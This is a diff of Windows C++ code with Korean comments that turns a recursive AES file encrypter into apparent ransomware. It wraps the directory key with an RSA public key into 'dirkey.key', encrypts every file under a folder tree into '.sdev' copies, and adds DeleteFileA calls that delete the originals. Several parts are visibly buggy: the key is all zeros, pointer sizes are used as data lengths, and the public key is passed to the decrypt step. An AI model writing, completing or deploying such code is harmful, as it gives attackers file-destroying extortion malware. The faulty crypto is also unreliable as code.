@@ -11,53 +11,82 @@ string getUserName() {
 }
 
 
-void EncryptDir(unsigned char* key, string& dirName)
-{
+void SaveEncKey(RSA* pubKey, string& dirName, unsigned char* key) {
+
+    // RSA 암호화
+    std::vector<unsigned char> encryptedData(RSA_size(pubKey), 0);
+    int result = RSA_public_encrypt(sizeof(key), key, encryptedData.data(), pubKey, RSA_PKCS1_PADDING);
+    for (int i = 0; i < 32; i++) {
+        printf("%02x", key[i]);
+    }
+    if (result == -1) {
+        std::cerr << "Error encrypting data." << std::endl;
+        RSA_free(pubKey);
+    }
+
+    string name = dirName + "\\";
+    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+    if (handle == INVALID_HANDLE_VALUE) {
+        cout << "파일 오픈 실패" << endl;
+        return;
+    }
+    WriteFile(handle, encryptedData.data(), sizeof(encryptedData.data()), NULL, NULL);
+
+}
+
+void GetDecKey(RSA* priKey, string& dirName, unsigned char* key) {
+    DWORD size = 512;
+    DWORD nRead;
+    unsigned char buf[512] = { 0x00, };
+    string name = dirName + "\\";
+    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    if (handle == INVALID_HANDLE_VALUE) {
+        cout << "파일 오픈 실패" << endl;
+        return;
+    }
+    if (ReadFile(handle, buf, size, &nRead, NULL) != TRUE) {
+        cout << "read dec key error" << "\n";
+    }
+    int result = RSA_private_decrypt(sizeof(buf), buf, key, priKey, RSA_PKCS1_PADDING);
+
+}
+
+
+void EncryptDir(RSA* pubKey, string& dirName) {
+    unsigned char _key[32] = {0x00, }; // generateKey();
+    SaveEncKey(pubKey, dirName, _key);
+
     WIN32_FIND_DATAA data;
     HANDLE hFind = nullptr;
     string folderName;
 
-    vector<string> folders;
-    vector<string> files;
+    string folder;
+    string file;
 
     cout << "\n\n ********** " + dirName + " **********" << endl;
     hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);
 
-    if (hFind == INVALID_HANDLE_VALUE){
-        return;
-    }
+    if (hFind == INVALID_HANDLE_VALUE)return;
 
     do {
-        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        {
-            folders.push_back(data.cFileName);
+        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            folder = data.cFileName;
+            if (folder == "." || folder == "..") {
+                continue;
+            }
+            folderName = dirName + "\\" + folder;
+            cout << "[Folder] " << folderName << endl;
+            EncryptDir(pubKey, folderName);
         }
-        else
-        {
-            files.push_back(data.cFileName);
+        else {
+            file = data.cFileName;
+            cout << "[File] " << file << endl;
+            EncryptFileByAES(_key, dirName, file);
         }
     } while (FindNextFileA(hFind, &data) != 0);
 
     FindClose(hFind);
 
-
-    // 파일 출력
-    for (string& file : files)
-    {
-        cout << "[File] " << file << endl;
-        EncryptFileByAES(key, dirName, file);
-    }
-
-    // 폴더 출력
-    for (string& folder : folders)
-    {
-        if (folder == "." || folder == "..") {
-            continue;
-        }
-        folderName = dirName + "\\" + folder;
-        cout << "[Folder] " << folderName << endl;
-        EncryptDir(key, folderName);
-    }
 }
 
 
@@ -74,25 +103,21 @@ void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName) {
 
     // 파일 이름 중 마지막 .위치 
     size_t lastDot = name.find_last_of('.');
-    // 확장자를 뺀 파일 이름
     string fileNameStem;
-    // 파일 확장자
     string fileExtension;
 
     if (lastDot != string::npos) {
         fileNameStem = name.substr(0, lastDot);
         fileExtension = name.substr(lastDot + 1);
-        if (fileExtension == "sdev") return;
+        if (fileExtension == "sdev" || fileExtension == "key") return;
     }
     else {
         fileNameStem = name;
     }
     // 암호화 할 파일 불러오기
-    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
     // 암호화 후 작성할 파일 불러오기 확장자 .sdev 로 설정
     handle2 = CreateFileA((fileNameStem + ".sdev").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-
     if (handle1 == INVALID_HANDLE_VALUE || handle2 == INVALID_HANDLE_VALUE) {
         cout << "파일 오픈 실패" << endl;
         return;
@@ -107,26 +132,22 @@ void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName) {
     cipher_buf = (unsigned char*)calloc(size, sizeof(char));
 
     // 암호화할 파일 읽어오기
-    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE)
-    {
+    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE) {
         cout << "fail to file open " << endl;
         return;
     }
-    else
-    {
-        //// 암호화
+    else {
+        // 암호화
         EncryptText(plain_buf, (unsigned int)size, key, cipher_buf);
-        // 암호화한 내용 .sdev 파일에 작성
         if (WriteFile(handle2, cipher_buf, nRead, &nWrite, NULL) != TRUE)
-        {
             cout << "fail to file write" << endl;
-        }
-        else {
+        else
             cout << fileName << " file is encrypted" << endl;
-        }
     }
     CloseHandle(handle1);
     CloseHandle(handle2);
+
+    DeleteFileA(name.c_str());
 
     free(plain_buf);
     free(cipher_buf);
@@ -143,10 +164,11 @@ void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* 
 
 
 
-
-
-void DecryptDir(unsigned char* key, string& dirName)
+void DecryptDir(RSA* pubKey, string& dirName)
 {
+    unsigned char _key[32] = { 0x00, };
+    GetDecKey(pubKey, dirName, _key);
+
     WIN32_FIND_DATAA data;
     HANDLE hFind = nullptr;
     string folderName;
@@ -157,19 +179,13 @@ void DecryptDir(unsigned char* key, string& dirName)
     cout << "\n\n ********** " + dirName + " **********" << endl;
     hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);
 
-    if (hFind == INVALID_HANDLE_VALUE) {
-        return;
-    }
+    if (hFind == INVALID_HANDLE_VALUE) return;
 
     do {
         if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        {
             folders.push_back(data.cFileName);
-        }
         else
-        {
             files.push_back(data.cFileName);
-        }
     } while (FindNextFileA(hFind, &data) != 0);
 
     FindClose(hFind);
@@ -179,7 +195,7 @@ void DecryptDir(unsigned char* key, string& dirName)
     for (string& file : files)
     {
         cout << "[File] " << file << endl;
-        DecryptFileByAES(key, dirName, file);
+        DecryptFileByAES(_key, dirName, file);
     }
 
     // 폴더 출력
@@ -190,7 +206,7 @@ void DecryptDir(unsigned char* key, string& dirName)
         }
         folderName = dirName + "\\" + folder;
         cout << "[Folder] " << folderName << endl;
-        DecryptDir(key, folderName);
+        DecryptDir(pubKey, folderName);
     }
 }
 
@@ -251,11 +267,13 @@ void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName) {
             cout << "fail to file write" << endl;
         }
         else {
-            cout << fileName << " file is encrypted" << endl;
+            cout << fileName << " file is decrypted" << endl;
         }
     }
     CloseHandle(handle1);
     CloseHandle(handle2);
+
+    DeleteFileA(name.c_str());
 
     free(plain_buf);
     free(cipher_buf);
